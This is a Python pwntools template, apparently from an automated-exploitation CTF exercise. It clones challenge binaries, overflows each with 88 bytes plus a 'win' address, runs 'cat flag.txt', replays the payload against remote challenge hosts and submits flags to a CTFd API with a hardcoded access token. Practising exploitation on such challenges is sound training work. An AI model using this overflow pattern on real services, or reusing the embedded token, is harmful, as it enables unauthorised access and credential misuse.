# ----------- ACE Template ----------- #

from pwn import *
import subprocess
import requests
import angr
import os
import json

# This helps debugging to shutup pwntools
# context.log_level = 'ERROR'
# logging.disable(logging.CRITICAL)

access_token = "ctfd_d8983bef2d9ab57507beddda65d569e7a519fea5df209cbc2ee0dfcb26c07696"


# URL of ctfd --
ctfd_url = "https://ace.ctfd.io"

# Headers needed for api calls
headers = {
    "Authorization": f"Token {access_token}",
    "Content-Type" : "application/json",
}

# Regex to help find flags in recvall
flag_pattern = r'flag\{[^}]+\}'

# ------------------------------------------------- #
# This is where your auto exploit code should be    #
# placed. This should craft the exploit locally to  #
# get the fake flag, send the exploit to the remote #
# binary, receive the flag, and submit the flag     #
# ------------------------------------------------- #


def  determineExploit(binary):

    exploitType = ""

    # Stuff to determine exploit type goes here

    # Do we have a win function?

    # Can we do a buffer overflow

    # Can we do a format attack? Unsafe print statement thing?

    # Can we get control of the instruction pointer?

    # partial or no relro???????

    return exploitType

def exploit(binary, chal_id):
    e = ELF(f"./{binary}")
    p = process(f"./{binary}")
    r = ROP(e)

    # No im not giving you the method for 
    # finding the overflow length
    overflow = b"A" * 88
    
    # Figure out the vuln by finding helpful things in bin
    # find_vuln()
    # Ex. if e.sym['win']

    # Find win...if it exists
    win = p64(e.sym["win"])

    # I miss movaps
    # ret = p64(r.find_gadget(['ret'])[0])
    
    # This will stay the same 
    p.recvuntil(b'>>>\n')

    # Creating an intricate payload
    payload = overflow + win
    
    p.sendline(payload)
    # Get that flag...hopefully
    p.sendline("cat flag.txt")
    flag = re.findall(flag_pattern, p.recvall(timeout=0.2).decode())
    p.close()

    # Check if you solved it 
    if flag:
        # print(f"Found flag {file_path}: {flag[0]}")
        send_exploit(binary, payload, chal_id)
    
    else:
        print(f"Couldn't exploit {file_path}!")



# ------------------------------------------------- #
# This function will send the payload to the remote #
# service running on that address and port          #
# ------------------------------------------------- #

def send_exploit(binary, payload, chal_id):
    url = f"ace-service-{binary}.chals.io"
    p = remote(url, 443, ssl=True, sni=url)
    p.recvuntil(">>>\n")     # Should all be the same (this will be clarified)
    p.sendline(payload)
    p.recvline()
    flag = re.findall(flag_pattern, p.recvall(timeout=0.2).decode())
    if flag:
        send_flag(flag, chal_id)
    else:
        # This comment is for Curtice <3
        print("Remote Exploit didn't work!")
    
# ------------------------------------------------- #
# This function will submit the flag to CTFd        #
# ------------------------------------------------- #
 
def send_flag(flag, chal_id):
    challenge_url = f"{ctfd_url}/api/v1/challenges/attempt"
    data = json.dumps({"challenge_id" : chal_id, "submission" : flag})
    response = requests.post(challenge_url, headers=headers, data=data)


# ------------------------------------------------- #
#                      MAIN                         #
# ------------------------------------------------- #

if __name__ == "__main__":
    

    # ----- Download Binary Repo ----- #
    while(1):
        try:
            subprocess.run("git clone https://github.com/tj-oconnor/ace-binaries.git", shell=True)
            os.chdir("ace-binaries/test-binaries") # CHANGE THIS EVENTUALLY
            break
        except Exception as e:
            print("Failed to clone git repo!")
    # -------------------------------- #


    # ----- Get the first chal id ---- #
    challenge_url = f"{ctfd_url}/api/v1/challenges"
    response = requests.get(challenge_url, headers=headers)
    json_data = json.loads(response.text).get("data", {})
    challenge_list = {i["name"]: int(i["id"]) for i in json_data}
    # -------------------------------- #

    # ----- Main Execution Loop! ----- #  
    for binary in os.listdir():
        try:
            if binary != "flag.txt":
                # Call exploit with id of each challenge to submit flag
                exploitType = determineExploit(challenge_list[binary])
                exploit(binary, challenge_list[binary])

        except Exception as e:
            print(f"Failed to exploit {binary}: {e}")
    # -------------------------------- #

    print("Exploitation Complete!")


